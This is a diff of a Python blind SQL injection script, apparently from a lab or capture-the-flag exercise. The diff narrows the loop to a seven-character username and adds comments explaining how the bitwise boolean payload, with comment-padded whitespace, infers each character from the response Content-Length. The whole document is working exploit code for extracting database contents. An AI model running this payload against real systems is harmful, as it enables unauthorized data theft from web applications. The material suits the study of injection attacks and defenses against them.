@@ -8,8 +8,8 @@ def inject(inj, ip):
 	username=""
 	bit="0"
 	value=0
-	for j in range(1,41):
-		for i in reversed(range(8)):
+	for j in range(1,8): #if the username has 7 characters
+		for i in reversed(range(8)): #one character has 8-bits
 			
 		 	injection_string = "test'/**/or/**/(ascii((substring((%s),%s,1)))>>%s)=%s/**/or/**/1='" % (inj,j,i,value)
 
@@ -20,10 +20,10 @@ def inject(inj, ip):
 
 		 	content_length = int(r.headers['Content-Length'])
 		 	if (content_length > 20):	 	    
-		 	    bit=bit+str("1")
-		 	    value=int(bit,2)		 	    
+		 	    bit=bit+str("1") #if it returns true, bit will increase by 1
+		 	    value=int(bit,2) #the value is decimal number from the updated bit		 	    
 			else:
-				bit=bit[:-1]
+				bit=bit[:-1] # if it returns false, bit will remove the latest value which is 1, and append 0, then append 1 for the next iteration
 				bit=bit+str("0")
 				bit=bit+str("1")
 				value=int(bit,2)
